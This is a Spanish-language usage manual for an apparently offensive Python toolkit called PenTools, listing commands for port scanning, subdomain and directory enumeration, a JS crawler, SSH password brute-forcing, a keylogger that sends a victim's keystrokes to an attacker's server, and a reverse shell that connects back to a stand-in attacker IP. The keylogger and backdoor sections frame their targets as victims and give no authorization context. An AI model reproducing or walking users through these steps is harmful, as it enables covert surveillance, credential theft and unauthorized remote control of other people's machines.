# 📘 Manual de Uso: PenTools

Este documento explica cómo utilizar paso a paso cada una de las herramientas de tu suite de ciberseguridad **PenTools**.

## 1. Escáner de Puertos (Port Scanner) 🕵️‍♂️
Descubre qué servicios están abiertos en una máquina.
- **Básico:** `python network/port_scanner.py 192.168.1.1`
- **Rango específico:** `python network/port_scanner.py 192.168.1.1 -p 1-100`
- **Más velocidad:** `python network/port_scanner.py 192.168.1.1 -t 200`

## 2. Enumeración de Subdominios 🌐
Encuentra subdominios ocultos de una web.
- **Modo Web (VHOST):** Busca sitios virtuales ocultos.
  `python web/subdomain_enumeration.py 10.10.10.10 google.com`
- **Modo DNS (Recomendado):** Pregunta a internet si el subdominio existe (más rápido).
  `python web/subdomain_enumeration.py 8.8.8.8 google.com --dns`

## 3. KeyLogger (Espía de Teclado) ⌨️
Graba lo que escribe la víctima y te lo envía.
1.  **En TU máquina (Atacante):** Inicia el servidor para recibir los datos.
    `python spyware/keylogger_server.py -p 8080`
2.  **En la víctima:** Ejecuta el cliente (necesita permisos de admin).
    `python spyware/keylogger.py --ip <TU_IP> --port 8080`
    *(Cuando la víctima pulse ENTER, recibirás todo lo que escribió)*.
    *Nota: Si antivirus lo detecta, es normal, es un comportamiento malicioso.*

## 4. SSH Brute Force (Rompe Claves) 🔓
Intenta adivinar la contraseña de un servidor SSH.
`python network/ssh_bruteforce.py 192.168.1.50 usuario resources/wordlists/diccionario.txt -t 10`

## 5. Buscador de Archivos JS (JS Crawler) 🕸️
Descarga todos los archivos JavaScript de una web para analizarlos en busca de fallos.
`python web/js_crawler.py http://ejemplo.com -o scripts_descargados`

## 6. Enumeración de Directorios 📂
Busca carpetas ocultas en una web (ej: /admin, /backup).
`python web/directory_enumeration.py 192.168.1.1 -w resources/wordlists/comun.txt`

## 7. Backdoors (Acceso Remoto) 🚪
Herramientas para mantener acceso a una máquina controlada de forma remota.

### Reverse Shell
Establece una conexión inversa desde la víctima hacia el atacante.

1.  **En TU máquina (Atacante):** Pon el servidor a la escucha.
    `python backdoors/listener.py -p 4444`
2.  **En la víctima:** Ejecuta el payload para conectar de vuelta.
    `python backdoors/reverse_shell.py --ip <TU_IP> --port 4444`

---
---
> **Nota:**
> Se han eliminado los ejecutables precompilados. Para usar las herramientas, asegúrate de tener Python instalado y ejecutar los scripts directamente como se muestra arriba.
